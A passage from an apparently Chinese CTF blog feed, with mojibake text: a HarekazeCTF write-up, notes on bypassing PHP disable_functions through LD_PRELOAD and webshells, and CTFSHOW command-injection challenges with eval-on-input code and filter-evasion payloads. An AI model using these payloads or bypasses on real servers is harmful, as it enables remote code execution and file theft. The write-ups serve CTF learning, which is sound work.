å¯†ä¸€ä¸‹ã€‚</p><pre class="line-numbers language-none"><code class="language-none">$content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\&#123;.+\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„çœ‹ä»£ç ï¼Œæ˜¯<code>is_valid($body)</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æ£€æµ‹çš„æ˜¯jsonå­—ç¬¦ä¸²ï¼Œè€Œ<code>file_get_contents()</code>è¯»å–çš„æ˜¯jsonè§£ç åçš„å­—ç¬¦ã€‚</p><p>å¯è§é—®é¢˜å°±å‡ºåœ¨è¿™ï¼Œæ€è·¯å°±æ˜¯<code>$body</code>æ£€æµ‹åŸå­—ç¬¦é€šè¿‡ï¼Œjsonè§£ç å­—ç¬¦è¯»å–flagã€‚</p><p>æ‰€ä»¥æœæœçœ‹<code>json_decode()</code>å¯å¾—</p><blockquote><p><code>json_decode()</code>ä¼šè‡ªåŠ¨è§£æunicodeå­—ç¬¦</p></blockquote><p>æ‰€ä»¥å¯ä»¥ç”¨unicodeç¼–ç ç»•è¿‡æ­£åˆ™</p><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#123; &quot;page&quot; : &quot;\u0070\u0068\u0070:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„ï¼Œéœ€ç”¨burpsuiteæˆ–å…¶ä»–åŠæ³•å‘åŒ…ï¼Œæµè§ˆå™¨ä¸å¯</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> json_decode() </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>disable_functions bypass</title>
      <link href="/p/3790227649.html"/>
      <url>/p/3790227649.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…·ä½“åŸç†ä¼šè´´è¿æ¥ï¼Œæ­¤æ–‡ä¸»è¦æ˜¯è®°å½•ä¸‹åŸºæœ¬æ“ä½œï¼Œä¾¿äºæ—¥ååšé¢˜ã€‚</p><h3 id="å‘½ä»¤ä¸å¯æ‰§è¡ŒåŸå› "><a href="#å‘½ä»¤ä¸å¯æ‰§è¡ŒåŸå› " class="headerlink" title="å‘½ä»¤ä¸å¯æ‰§è¡ŒåŸå› "></a>å‘½ä»¤ä¸å¯æ‰§è¡ŒåŸå› </h3><blockquote><p>é€šå¸¸æ¥è¯´ï¼Œå¯¼è‡´ webshell ä¸èƒ½æ‰§è¡Œå‘½ä»¤çš„åŸå› å¤§æ¦‚æœ‰ä¸‰ç±»ï¼š</p><p>1.php.ini ä¸­ç”¨ disable_functions æŒ‡ç¤ºå™¨ç¦ç”¨äº† system()ã€exec() ç­‰ç­‰è¿™ç±»å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³å‡½æ•°ï¼›</p><p>2.web è¿›ç¨‹è¿è¡Œåœ¨ rbash è¿™ç±»å—é™ shell ç¯å¢ƒä¸­ï¼›</p><p>3.WAFæ‹¦æˆªã€‚è‹¥æ˜¯ä¸€åˆ™æ— æ³•æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œè‹¥æ˜¯äºŒã€ä¸‰åˆ™å¯ä»¥æ‰§è¡Œå°‘é‡å‘½ä»¤ã€‚</p></blockquote><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><ul><li><p>disable_functionsçš„å››ç§bypassæ³•</p><blockquote><p>1.æ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€webåº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagickçš„é­”å›¾æ¼æ´ã€bashçš„ç ´å£³æ¼æ´ï¼›</p><p>2.å¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•ï¼Œæˆ–è®¸æœ‰æ¼ç½‘ä¹‹é±¼ï¼›</p><p>3.mod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹.htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡php.iniä¸­çš„ä»»ä½•é™åˆ¶ï¼›</p><p>4.åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœã€‚</p></blockquote></li></ul><p>åœ¨æ­¤è®°å½•ä¸‹bypassçš„ä¸€èˆ¬æ“ä½œ</p><h3 id="æ”»å‡»åç«¯ç»„ä»¶"><a href="#æ”»å‡»åç«¯ç»„ä»¶" class="headerlink" title="æ”»å‡»åç«¯ç»„ä»¶"></a>æ”»å‡»åç«¯ç»„ä»¶</h3><p>åœ¨phpinfo()ä¸­æŸ¥çœ‹ç»„ä»¶ç‰ˆæœ¬ï¼Œä¾‹å¦‚<code>ImageMagick</code></p><p>ç„¶åç”¨<code>searchsploit</code>æœç´¢ç›¸å…³pocå¹¶åŠ ä»¥åˆ©ç”¨ã€‚</p><p><img src="/../images/disable-functions-bypass/image-20210717172227637.png"></p><p>TODOï¼šæ‰¾ä¸ªä¾‹é¢˜å®é™…æ“ä½œä¸‹</p><hr><h3 id="åˆ©ç”¨LD-PRELOAD"><a href="#åˆ©ç”¨LD-PRELOAD" class="headerlink" title="åˆ©ç”¨LD_PRELOAD"></a>åˆ©ç”¨LD_PRELOAD</h3><blockquote><p>è®¾æƒ³è¿™æ ·ä¸€ç§æ€è·¯ï¼šåˆ©ç”¨æ¼æ´æ§åˆ¶webå¯åŠ¨æ–°è¿›ç¨‹a.binå³ä¾¿è¿›ç¨‹åæ— æ³•è®©æˆ‘éšæ„æŒ‡å®š),a.binå†…éƒ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•°b()ï¼Œb()ä½äºç³»ç»Ÿå…±äº«å¯¹è±¡c.soä¸­ï¼Œæ‰€ä»¥ç³»ç»Ÿä¸ºè¯¥è¿›ç¨‹åŠ è½½å…±c.soï¼Œæˆ‘æƒ³æ³•åœ¨c.soå‰ä¼˜å…ˆåŠ è½½å¯æ§çš„c_evil.soï¼Œc_evil.soå†…å«ä¸ b()åŒåçš„æ¶æ„å‡½æ•°ï¼Œç”±äºc_evil.soä¼˜å…ˆçº§è¾ƒé«˜ï¼Œæ‰€ä»¥ï¼Œa.binå°†è°ƒç”¨åˆ°c_evil.soå†…b()è€Œéç³»ç»Ÿçš„c.soå†…b()ï¼ŒåŒæ—¶ï¼Œc_evil.soå¯æ§ï¼Œè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ã€‚åŸºäºè¿™ä¸€æ€è·¯ï¼Œå°†çªç ´disable_functionsé™åˆ¶æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤è¿™ä¸€ç›®æ ‡ï¼Œå¤§è‡´åˆ†è§£æˆå‡ æ­¥åœ¨æœ¬åœ°æ¨æ¼”ï¼šæŸ¥çœ‹è¿›ç¨‹è°ƒç”¨ç³»ç»Ÿå‡½æ•°æ˜ç»†ã€æ“ä½œç³»ç»Ÿç¯å¢ƒä¸‹åŠ«æŒç³»ç»Ÿå‡½æ•°æ³¨å…¥ä»£ç ã€æ‰¾å¯»å†…éƒ¨å¯åŠ¨æ–°è¿›ç¨‹çš„ PHPå‡½æ•°ã€PHPç¯å¢ƒä¸‹åŠ«æŒç³»ç»Ÿå‡½æ•°æ³¨å…¥ä»£ç ã€‚</p></blockquote><p>æŸ¥çœ‹ç³»ç»ŸåŠ è½½çš„å…±äº«å¯¹è±¡<code>ldd /usr/bin/id</code></p><p><img src="/../images/disable-functions-bypass/image-20210717172619760.png"></p><p>ç”±äºå¯æ‰§è¡Œæ–‡ä»¶/usr/bin/idå†…å«ç¬¦å·è¡¨,æ‰€ä»¥ï¼Œè¿è¡Œ<code>nm -D /usr/bin/id 2&gt;&amp;1</code>æˆ–<code>readelf -Ws /usr/bin/id</code>å¯æŸ¥çœ‹è¯¥ç¨‹åºå¯èƒ½è°ƒç”¨çš„ç³»ç»Ÿ API æ˜ç»†ï¼š</p><p><img src="/../images/disable-functions-bypass/image-20210717173012286.png"></p><p><code>strace -f /usr/bin/id 2&gt;&amp;1</code> è·Ÿè¸ªå‘½ä»¤<code>/usr/bin/id</code>å®é™…APIè°ƒç”¨æƒ…å†µ</p><blockquote><p>æ“ä½œç³»ç»Ÿç¯å¢ƒä¸‹åŠ«æŒç³»ç»Ÿå‡½æ•°æ³¨å…¥ä»£ç ã€‚linuxçš„ç¯å¢ƒå˜é‡LD_PRELOADæ˜¯ä¸€ç§ç±»ä¼¼win32 API hookçš„æ›´ä¼˜é›…çš„å®ç°ï¼Œé€‚ç”¨äºæ‰“çƒ­è¡¥ä¸ã€è¯»å–è¿›ç¨‹ç©ºé—´æ•°æ®ã€ç¦æ­¢ç¨‹åºè°ƒç”¨æŒ‡å®š APIã€è°ƒè¯•ç¨‹åºç­‰ç­‰åœºæ™¯ï¼Œç”šè‡³å¯ä»¥åœ¨ä¸æ›´æ”¹åŸå§‹å¯æ‰§è¡Œæ–‡ä»¶å‰æä¸‹æ¤å…¥åé—¨(ç®¡ç†å‘˜å¸¸ç”¨çš„/bin/ps)</p></blockquote><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>å…·ä½“è§ï¼š<a href="https://www.freebuf.com/articles/web/192052.html">æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions</a></p><p>2021å¹´7æœˆ17æ—¥20:47:31ï¼šå¼ºçƒˆæ¨èé˜…è¯»ï¼Œå†…å®¹è¯¦å°½ï¼Œå¯¹å°ç™½ååˆ†å‹å¥½ï¼Œçœ‹çš„æ—¶å€™ç›´å‘¼è¿‡ç˜¾ï¼Œçœ‹å®Œåç”¨æ‰‹ä¸Šçš„é¢˜éªŒè¯æ‰€æƒ³ï¼Œå†…å¿ƒçœŸçš„å¾ˆæ¿€åŠ¨ã€‚</p><p><strong>ä¸ªäººæ€»ç»“</strong></p><p>é¦–å…ˆæ‰¾åˆ°ä¸€ä¸ªç‰¹æ®ŠPHPå‡½æ•°ï¼Œè¦æ±‚æ˜¯è¿™ä¸ªå‡½æ•°æ‰§è¡Œä¼šè°ƒç”¨ä¸¤æ¬¡<code>execve</code>ï¼Œç¬¬ä¸€æ¬¡æ˜¯å¯åŠ¨PHPè§£é‡Šå™¨ï¼Œç¬¬äºŒæ¬¡æ˜¯å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚åˆ©ç”¨ç¬¬äºŒæ¬¡<code>execve</code>å¯åŠ¨å¤–éƒ¨ç¨‹åºã€‚</p><p>ç„¶åæ‰¾åˆ°<code>__attribute__</code>ï¼Œè¿™ä¸ªCè¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦åœ¨åŠ è½½å…±äº«å¯¹è±¡çš„æ—¶å€™å°±ä¼šæ‰§è¡Œé‡Œé¢çš„ä»£ç ï¼Œäºæ˜¯å†™å…¥æ¶æ„ä»£ç å°†åŸæ¥çš„æ­£å¸¸ä»£ç ç»™è¦†ç›–äº†ï¼Œç”Ÿæˆ<code>evil.so</code>æ–‡ä»¶ã€‚</p><p>ä¹‹ååˆ©ç”¨<code>putenv()</code>å°†<code>LD_PRELOAD</code>å˜é‡æŒ‡å‘ä¸ºè‡ªå·±çš„<code>evil.so</code>æ–‡ä»¶ï¼Œä¹Ÿæ˜¯åˆ©ç”¨<code>putenv()</code>å°†æƒ³è¦æ‰§è¡Œçš„ä»£ç æ”¾åˆ°ç³»ç»Ÿå˜é‡ã€‚</p><p>é€»è¾‘å¦‚ä¸‹ï¼šæ‰“å…¥payloadï¼Œæ¶æ„ä»£ç è¢«å†™å…¥åˆ°ç³»ç»Ÿå˜é‡-&gt;æ‰§è¡Œç‰¹æ®ŠPHPå‡½æ•°-&gt;ç¬¬ä¸€æ¬¡execveå¯åŠ¨PHPè§£é‡Šå™¨ï¼Œç¬¬äºŒæ¬¡execveå¯åŠ¨æ–°è¿›ç¨‹-&gt;æ–°è¿›ç¨‹é‡æ–°åŠ è½½å…±äº«æ–‡ä»¶ï¼Œ<code>evil.so</code>è¢«åŠ è½½-&gt;è§¦å‘è‡ªå·±å†™å…¥çš„<code>__attribute__</code>-&gt;<code>__attribute__</code>ä¸­æœ‰<code>system()</code>ï¼Œæ¶æ„ä»£ç åœ¨ç³»ç»Ÿå˜é‡ä¸­ï¼Œäºæ˜¯<code>system(&#39;æ¶æ„ä»£ç &#39;)</code></p><p>è€Œè¿™ä¸ªç‰¹æ®ŠPHPå‡½æ•°å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//ä»¥ä¸‹ä¸‰ä¸ªå¯ä»¥ä¸€èµ·æ”¾ç€ï¼Œå‡½æ•°è¢«ç¦ç”¨ä¹Ÿä¸éœ€è¦æ³¨é‡Šï¼Œä¸å½±å“</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mb_send_mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä»¥ä¸‹ä¸¤ä¸ªæ²¡æœ‰åˆ™éœ€è¦æ³¨é‡Šæ‰ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸æ‰§è¡Œ</span><span class="token comment">// $img = Imagick("1.mp4"); //å¦‚æœæœ‰ImageMagickè¿™ä¸ªæ‰©å±•(æ–‡ä»¶å¿…é¡»å­˜åœ¨)</span><span class="token comment">// imap_mail("", "", ""); //éœ€è¦å®‰è£…imapæ‹“å±•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…·ä½“é¢˜ç›®å¯è§<code>åˆ·é¢˜ç¬”è®°:[SUCTF 2019]EasyWeb</code></p><h4 id="èšå‰‘å®æ“"><a href="#èšå‰‘å®æ“" class="headerlink" title="èšå‰‘å®æ“"></a>èšå‰‘å®æ“</h4><p><img src="/../images/disable-functions-bypass/image-20210717205438970.png"></p><p>ç„¶ååˆ›å»ºå‰¯æœ¬(å¯†ç ä¸åŸæ¥çš„shellå¯†ç ç›¸åŒ)ï¼Œç”¨èšå‰‘è¿æ¥<code>/.antproxy.php</code></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> disable_functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CTFSHOW]å‘½ä»¤æ‰§è¡Œåˆé›†</title>
      <link href="/p/496294805.html"/>
      <url>/p/496294805.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¥æºäº</p><p><a href="https://hellohy.top/huayang/1102.html#respond">ã€åŸåˆ›ã€‘ctfshowâ€”webå…¥é—¨â€”å‘½ä»¤æ‰§è¡Œ ï¼ˆ29-77ï¼‰ï¼ˆæŒç»­æ›´æ–°ï¼‰</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/109837640">[CTFSHOW]å‘½ä»¤æ‰§è¡Œ</a></p><p>è¿›è¡Œå½’çº³æ€»ç»“ã€‚</p><h2 id="Web29-flag"><a href="#Web29-flag" class="headerlink" title="Web29 flag"></a>Web29 flag</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload1<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl fla?????"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>payload2<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>payload3<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fl''ag.php`</span><span class="token punctuation">;</span>æˆ–è€…c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl flâ€œâ€ag.php`</span><span class="token punctuation">;</span>payload4<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fl\ag.php`</span><span class="token punctuation">;</span><span class="token comment">//è½¬ä¹‰å­—ç¬¦ç»•è¿‡</span>payload5<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span>payload6<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nl flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>payload7<span class="token punctuation">:</span>c<span class="token operator">=</span>awk <span class="token string single-quoted-string">'&#123;printf $0&#125;'</span> flag<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web30-system-php"><a href="#Web30-system-php" class="headerlink" title="Web30 system|php"></a>Web30 system|php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¢å…¶ä»–å‡½æ•°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>åå¼•å· åŒ<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web31-cat-sort-shell"><a href="#Web31-cat-sort-shell" class="headerlink" title="Web31 cat|sort|shell"></a>Web31 cat|sort|shell</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nl flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ‰«æå½“å‰è·¯å¾„ä¸‹æ–‡ä»¶è¿”å›æ•°ç»„->æ•°ç»„å€’å™->è¾“å‡ºä¸‹ä¸€ä¸ªå…ƒç´ </span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//pos(localeconv()) ç»„æˆ.ç‚¹å·ï¼ŒåŠ ä¸Šscandirå°±æ˜¯æ‰«æå½“ä¸‹ç›®å½•ã€‚å…·ä½“çœ‹Web40</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`nl%09fl[abc]*`</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token string double-quoted-string">"\x73\x79\x73\x74\x65\x6d"</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl%09fl[a]*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ç­‰ä»·äº<span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token string backtick-quoted-string">`strings%09f*`</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token string backtick-quoted-string">`strings\$IFS\$9f*`</span>å¿…é¡»åŠ è½¬ä¹‰å­—ç¬¦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web32-echo-â€™"><a href="#Web32-echo-â€™" class="headerlink" title="Web32 echo|â€™|(|;"></a>Web32 echo|â€™|(|;</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token 